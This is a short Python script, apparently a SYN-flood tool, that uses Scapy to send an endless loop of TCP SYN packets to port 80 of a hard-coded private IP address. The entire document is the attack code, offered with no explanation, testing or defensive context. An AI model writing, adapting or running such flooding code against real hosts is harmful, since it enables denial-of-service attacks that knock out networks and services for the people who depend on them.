import scapy.all as scapy
import threading

TARGET_IP = "10.100.102.1"

def syn_flood():
    global TARGET_IP
    while True:
        scapy.sr1(scapy.IP(dst=TARGET_IP) / scapy.TCP(dport=80, flags="S"), verbose=False)
